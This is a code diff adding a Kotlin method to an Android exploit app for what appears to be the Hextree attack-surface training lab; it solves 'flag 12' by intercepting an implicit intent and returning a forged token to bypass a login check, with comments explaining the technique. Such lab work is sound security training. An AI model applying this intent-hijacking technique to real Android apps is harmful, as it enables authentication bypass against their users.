@@ -238,4 +238,28 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		}
 		activity.startActivityForResult(intent,9)
 	}
+
+	/**
+	 * FLAG 12 - Implicit Intent Interception
+	 * Technique: Intent Filter Registration + Result Manipulation
+	 *
+	 * Flow:
+	 * 1. We launch Flag12Activity with LOGIN=true extra
+	 * 2. Flag12 sends implicit intent "io.hextree.attacksurface.ATTACK_ME"
+	 * 3. Our HextreeActivity intercepts it (registered in manifest for this action)
+	 * 4. We return token=1094795585 (0x41414141) back via setResult()
+	 * 5. Flag12's onActivityResult() validates LOGIN=true + token → success()
+	 *
+	 * Key insight: Flag12 trusts whoever handles its implicit intent.
+	 * Any app registered for that action can intercept and respond with fake data.
+	 */
+	fun flag12() {
+		val activityPath = "$packageName.activities.Flag12Activity"
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("LOGIN", true) // required — onActivityResult() checks this
+			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+		}
+		context.startActivity(intent)
+	}
 }
